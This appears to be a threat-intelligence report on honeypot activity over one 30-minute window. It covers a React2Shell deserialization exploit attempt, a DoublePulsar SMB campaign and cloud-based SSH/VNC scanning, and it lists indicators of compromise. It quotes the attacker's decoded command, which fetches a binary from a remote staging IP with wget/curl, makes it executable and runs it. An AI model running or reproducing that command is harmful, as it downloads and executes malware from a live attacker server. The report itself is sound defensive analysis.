# Investigative Report: Honeypot Activity Analysis
**Timeframe:** 2026-02-24T15:00:00Z – 2026-02-24T15:30:00Z
**Incident ID:** IR-20260224-1530
**Status:** High Priority

## 1. Investigation Scope
This report documents the analysis of honeypot sensor data for the most recently completed 30-minute UTC window. The investigation focused on identifying emerging exploitation patterns, high-volume automated attacks, and infrastructure clustering.

## 2. Baseline Activity Overview
- **Total Attack Volume:** 2,591 events.
- **Geographic Concentration:** Australia (1,074), United States (518), United Kingdom (318), Bolivia (278), Indonesia (alerts only).
- **Top ASNs:** 
    - AS14061 (DigitalOcean, LLC): 1,666 hits (Distributed across AU, UK, US).
    - AS26210 (AXS Bolivia S. A.): 278 hits.
    - AS141127 (PT Anugerah Cimanuk Raya): ~1,640 alert events (ID).
- **Primary Targeted Services:**
    - **Port 445 (SMB):** Heavily targeted by Indonesian and Bolivian infrastructure.
    - **Port 22 (SSH):** Dominant target for DigitalOcean-based scanning.
    - **Port 5901-5905 (VNC):** Secondary target from US-based infrastructure.
    - **Port 3000/3002 (Web/React):** Targeted for high-severity RCE.

## 3. Significant Findings

### 3.1 React2Shell Exploitation Wave (CVE-2025-55182)
A targeted exploitation attempt of the "React2Shell" vulnerability was identified.
- **Source IP:** `176.65.139.44` (Germany, Pfcloud UG)
- **Attack Vector:** HTTP POST request to `/formaction` and `/_rsc`.
- **Payload Analysis:** The attacker utilized an insecure deserialization flaw in the React Flight protocol to execute a base64 encoded command:
    - **Decoded Command:** `wget http://130.12.180.69/x86_64 || curl http://130.12.180.69/x86_64 -o x86_64; chmod 777 x86_64; ./x86_64 React`
- **Objective:** Retrieval and execution of an architecture-specific binary (x86_64) from remote infrastructure (`130.12.180.69`).

### 3.2 Massive DoublePulsar / SMB Campaign
High-intensity SMB activity was detected, primarily associated with the DoublePulsar backdoor.
- **Source IP:** `103.158.121.141` (Indonesia, PT Anugerah Cimanuk Raya)
- **Signature:** `ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication` (Signature ID: 2024766).
- **Impact:** 1,640 alerts generated within 30 minutes, indicating either a massive automated scan for vulnerable systems or an attempt to communicate with previously infected hosts.

## 4. Hypothesis Development and Validation

### Hypothesis 1: Coordinated Multi-Regional Cloud Scanning
**Observation:** AS14061 (DigitalOcean) infrastructure in Australia, UK, and US are all engaged in persistent, automated scanning across SSH and VNC.
- **Validation:** 
    - `134.199.173.225` (AU) -> SSH (1,074 hits)
    - `159.65.85.38` (UK) -> SSH (300 hits)
    - `165.245.138.210` (US) -> VNC (200+ hits)
**Conclusion:** High confidence. This infrastructure is likely part of a single botnet or large-scale reconnaissance operation leveraging cloud VPS services to evade regional blocking.

### Hypothesis 2: Persistent SMB Worm Propagation
**Observation:** Consistent targeting of Port 445 from South American and Indonesian ASNs with exploit signatures for 2017-era vulnerabilities.
- **Validation:** Correlated Dionaea session logs showing SMB negotiate and setup requests from `200.105.151.2` (Bolivia) and aggressive DoublePulsar alerting from `103.158.121.141` (Indonesia).
**Conclusion:** Moderate confidence. Suggests the continued automated propagation of SMB-based worms/backdoors in regional IP blocks.

## 5. Infrastructure and Behavioral Analysis
- **Command & Control (C2) / Staging:** `130.12.180.69` (Observed in React2Shell payload).
- **Automated Tooling:** Use of `SSH-2.0-Go` client strings confirms the use of Go-based automated scanners for SSH brute-forcing.
- **Brute-Force Credentials:** Top credentials observed (`root`, `guest`, `123456`) remain aligned with global baseline noise, suggesting opportunistic rather than targeted credential harvesting.

## 6. Analytical Conclusion
The window is characterized by a significant surge in **SMB exploitation (DoublePulsar)** and an emerging, high-threat **RCE campaign (React2Shell)**. While the cloud-based scanning from DigitalOcean represents a steady "background" noise of automated reconnaissance, the unauthenticated RCE attempt from German infrastructure represents a critical threat aimed at modern web framework deployments (React/Next.js).

## 7. Confidence Assessment
- **Overall Confidence:** High
- **Data Integrity:** No significant gaps or shard failures were noted during the query window. Findings are backed by both behavioral (Dionaea/Cowrie) and signature-based (Suricata) evidence.

## 8. Indicators of Compromise (IOCs)
- **IP:** `176.65.139.44` (React2Shell Attacker)
- **IP:** `103.158.121.141` (DoublePulsar Aggressor)
- **IP:** `130.12.180.69` (Malware Staging Server)
- **Binary Path:** `/x86_64` (Remote)
- **Command String:** `wget http://130.12.180.69/x86_64...`
